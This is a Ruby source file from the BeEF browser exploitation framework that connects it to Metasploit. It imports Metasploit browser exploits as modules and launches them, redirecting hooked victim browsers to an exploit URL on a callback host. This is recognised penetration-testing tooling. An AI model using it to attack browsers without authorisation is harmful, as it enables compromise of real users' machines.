#
# Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Extension
    module Metasploit
      module API

        module MetasploitHooks

          BeEF::API::Registrar.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Modules, 'post_soft_load')
          BeEF::API::Registrar.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Server, 'mount_handler')

          # Load modules from metasploit just after all other module config is loaded
          def self.post_soft_load
            msf = BeEF::Extension::Metasploit::RpcClient.instance
            if msf.login
              msf_module_config = {}
              path = BeEF::Core::Configuration.instance.get('beef.extension.metasploit.path')
              if !BeEF::Core::Console::CommandLine.parse[:resetdb] && File.exists?("#{path}msf-exploits.cache")
                print_debug "Attempting to use Metasploit exploits cache file"
                raw = File.read("#{path}msf-exploits.cache")
                begin
                  msf_module_config = YAML.load(raw)
                rescue => e
                  puts e
                end
                count = 1
                msf_module_config.each { |k, v|
                  BeEF::API::Registrar.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Module, 'get_options', [k])
                  BeEF::API::Registrar.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Module, 'get_payload_options', [k, nil])
                  BeEF::API::Registrar.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Module, 'override_execute', [k, nil, nil])
                  print_over "Loaded #{count} Metasploit exploits."
                  count += 1
                }
                print "\r\n"
              else
                msf_modules = msf.call('module.exploits')
                count = 1
                msf_modules['modules'].each { |m|
                  next if !m.include? "/browser/"
                  m_details = msf.call('module.info', 'exploit', m)
                  if m_details
                    key = 'msf_'+m.split('/').last
                    # system currently doesn't support multilevel categories
                    #categories = ['Metasploit']
                    #m.split('/')[0...-1].each{|c|
                    #    categories.push(c.capitalize)
                    #}

                    if m_details['description'] =~ /Java|JVM|flash|Adobe/i
                      target_browser = {BeEF::Core::Constants::CommandModule::VERIFIED_USER_NOTIFY => ["ALL"]}
                    elsif m_details['description'] =~ /IE|Internet\s+Explorer/i
                      target_browser = {BeEF::Core::Constants::CommandModule::VERIFIED_WORKING => ["IE"]}
                    elsif m_details['description'] =~ /Firefox/i
                      target_browser = {BeEF::Core::Constants::CommandModule::VERIFIED_WORKING => ["FF"]}
                    elsif m_details['description'] =~ /Chrome/i
                      target_browser = {BeEF::Core::Constants::CommandModule::VERIFIED_WORKING => ["C"]}
                    elsif m_details['description'] =~ /Safari/i
                      target_browser = {BeEF::Core::Constants::CommandModule::VERIFIED_WORKING => ["S"]}
                    elsif m_details['description'] =~ /Opera/i
                      target_browser = {BeEF::Core::Constants::CommandModule::VERIFIED_WORKING => ["O"]}
                    end
                    #TODO:
                    #  - Add support for detection of target OS
                    #  - Add support for detection of target services (e.g. java, flash, silverlight, ...etc)
                    #  - Add support for multiple target browsers as currently only 1 browser will match or all



                    msf_module_config[key] = {
                        'enable'     => true,
                        'msf'        => true,
                        'msf_key'    => m,
                        'name'       => m_details['name'],
                        'category'   => 'Metasploit',
                        'description'=> m_details['description'],
                        'authors'    => m_details['references'],
                        'path'       => path,
                        'class'      => 'Msf_module',
                        'target'     => target_browser
                    }
                    BeEF::API::Registrar.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Module, 'get_options', [key])
                    BeEF::API::Registrar.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Module, 'get_payload_options', [key, nil])
                    BeEF::API::Registrar.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Module, 'override_execute', [key, nil, nil])
                    print_over "Loaded #{count} Metasploit exploits."
                    count += 1
                  end
                }
                print "\r\n"
                File.open("#{path}msf-exploits.cache", "w") do |f|
                  f.write(msf_module_config.to_yaml)
                  print_debug "Wrote Metasploit exploits to cache file"
                end
              end
              BeEF::Core::Configuration.instance.set('beef.module', msf_module_config)
            end
          end

          # Get module options + payloads when the beef framework requests this information
          def self.get_options(mod)
            msf_key = BeEF::Core::Configuration.instance.get("beef.module.#{mod}.msf_key")
            msf = BeEF::Extension::Metasploit::RpcClient.instance
            if msf_key != nil && msf.login
              msf_module_options = msf.call('module.options', 'exploit', msf_key)
              com = BeEF::Core::Models::CommandModule.first(:name => mod)
              if msf_module_options
                options = BeEF::Extension::Metasploit.translate_options(msf_module_options)
                options << {
                  'name'  => 'mod_id',
                  'id'    => 'mod_id',
                  'type'  => 'hidden',
                  'value' => com.id
                }
                msf_payload_options = msf.call('module.compatible_payloads', msf_key)
                if msf_payload_options
                  options << BeEF::Extension::Metasploit.translate_payload(msf_payload_options)
                  return options
                else
                  print_error "Unable to retrieve metasploit payloads for exploit: #{msf_key}"
                end
              else
                print_error "Unable to retrieve metasploit options for exploit: #{msf_key}"
              end
            end
          end

          # Execute function for all metasploit exploits
          def self.override_execute(mod, hbsession, opts)
            msf = BeEF::Extension::Metasploit::RpcClient.instance
            msf_key = BeEF::Core::Configuration.instance.get("beef.module.#{mod}.msf_key")
            msf_opts = {}

            opts.each { |opt|
              next if ['e', 'ie_session', 'and_module_id'].include? opt['name']
              msf_opts[opt["name"]] = opt["value"]
            }

            if msf_key != nil && msf.login
              # Are the options correctly formatted for msf?
              # This call has not been tested
              msf.call('module.execute', 'exploit', msf_key, msf_opts)
            end

            hb = BeEF::HBManager.get_by_session(hbsession)
            if !hb
              print_error "Could not find hooked browser when attempting to execute module '#{mod}'"
              return false
            end

            bopts = []
            if msf_opts['SSL']
              proto = 'https'
            else
              proto = 'http'
            end
            config = BeEF::Core::Configuration.instance.get('beef.extension.metasploit')
            uri = proto + '://' + config['callback_host'] + ":" + msf_opts['SRVPORT'] + "/" + msf_opts['URIPATH']


            bopts << {:sploit_url => uri}
            c = BeEF::Core::Models::Command.new(:data => bopts.to_json,
                                                :hooked_browser_id => hb.id,
                                                :command_module_id => BeEF::Core::Configuration.instance.get("beef.module.#{mod}.db.id"),
                                                :creationdate => Time.new.to_i
            ).save

            # Still need to create command object to store a string saying "Exploit launched @ [time]", to ensure BeEF can keep track of
            # which exploits where executed against which hooked browsers
            return true
          end

          # Get module options + payloads when the beef framework requests this information
          def self.get_payload_options(mod, payload)
            msf_key = BeEF::Core::Configuration.instance.get("beef.module.#{mod}.msf_key")

            msf = BeEF::Extension::Metasploit::RpcClient.instance
            if msf_key != nil && msf.login
              msf_module_options = msf.call('module.options', 'payload', payload)

              com = BeEF::Core::Models::CommandModule.first(:name => mod)
              if msf_module_options
                options = BeEF::Extension::Metasploit.translate_options(msf_module_options)
                return options
              else
                print_error "Unable to retrieve metasploit payload options for exploit: #{msf_key}"
              end
            end
          end

          # Mounts the handler for processing Metasploit RESTful API requests.
          #
          # @param beef_server [BeEF::Core::Server] HTTP server instance
          def self.mount_handler(beef_server)
            beef_server.mount('/api/msf', BeEF::Extension::Metasploit::MsfRest.new)
          end
        end
      end
    end
  end
end
